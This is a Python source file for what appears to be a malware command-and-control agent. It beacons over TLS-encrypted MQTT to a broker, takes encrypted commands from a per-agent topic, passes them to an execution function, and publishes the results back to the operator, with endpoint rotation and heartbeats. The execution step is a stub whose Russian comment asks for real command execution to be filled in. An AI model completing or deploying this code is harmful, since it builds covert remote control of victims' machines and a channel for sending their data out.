import ssl
import uuid
import json
import logging
import threading
import time

import paho.mqtt.client as mqtt

from c2.secure_configs.token_manager import verify_jwt_token
from c2.utils.encryption import encrypt_payload, decrypt_payload
from c2.utils.endpoint_rotation import get_topic_for_agent
from c2.database.command_store import fetch_next_command, store_result
from c2.utils.telemetry_logger import log_event

BROKER_HOST = "mqtt.teslaai.local"
BROKER_PORT = 8883
CA_CERT = "/etc/ssl/ca.pem"
CLIENT_CERT = "/etc/ssl/client.pem"
CLIENT_KEY = "/etc/ssl/client.key"

logger = logging.getLogger("mqtt_c2")
logger.setLevel(logging.INFO)


class MqttC2Client:
    def __init__(self, agent_id=None):
        self.agent_id = agent_id or str(uuid.uuid4())
        self.client = mqtt.Client(client_id=self.agent_id, clean_session=True)
        self.client.on_connect = self._on_connect
        self.client.on_message = self._on_message
        self.command_topic = get_topic_for_agent(self.agent_id, "command")
        self.result_topic = get_topic_for_agent(self.agent_id, "result")
        self.auth_token = None

    def _on_connect(self, client, userdata, flags, rc):
        if rc == 0:
            logger.info(f"[+] Connected to MQTT broker as {self.agent_id}")
            self.client.subscribe(self.command_topic, qos=1)
            log_event("agent_connected", self.agent_id, {"topic": self.command_topic})
        else:
            logger.error(f"[-] MQTT connection failed with code {rc}")

    def _on_message(self, client, userdata, msg):
        try:
            if not self._authenticate():
                logger.warning("Unauthenticated agent message ignored")
                return
            payload = decrypt_payload(msg.payload.decode())
            log_event("command_received", self.agent_id, {"size": len(payload)})
            result = self._execute_command(payload)
            encrypted_result = encrypt_payload(result)
            self.client.publish(self.result_topic, encrypted_result, qos=1)
            log_event("result_submitted", self.agent_id, {"bytes": len(result)})
        except Exception as e:
            logger.exception("[-] MQTT message handling error")

    def _execute_command(self, payload):
        # STUB: Реализуй тут реальное выполнение команд
        return f"executed: {payload}"

    def _authenticate(self):
        return verify_jwt_token(self.auth_token)

    def connect(self, auth_token):
        self.auth_token = auth_token
        self.client.tls_set(ca_certs=CA_CERT, certfile=CLIENT_CERT, keyfile=CLIENT_KEY, cert_reqs=ssl.CERT_REQUIRED)
        self.client.tls_insecure_set(False)
        self.client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
        threading.Thread(target=self.client.loop_forever, daemon=True).start()

    def heartbeat_loop(self):
        while True:
            log_event("heartbeat", self.agent_id, {"timestamp": int(time.time())})
            time.sleep(30)


if __name__ == "__main__":
    client = MqttC2Client()
    client.connect(auth_token="Bearer YOUR_JWT_HERE")
    threading.Thread(target=client.heartbeat_loop, daemon=True).start()
    while True:
        time.sleep(3600)
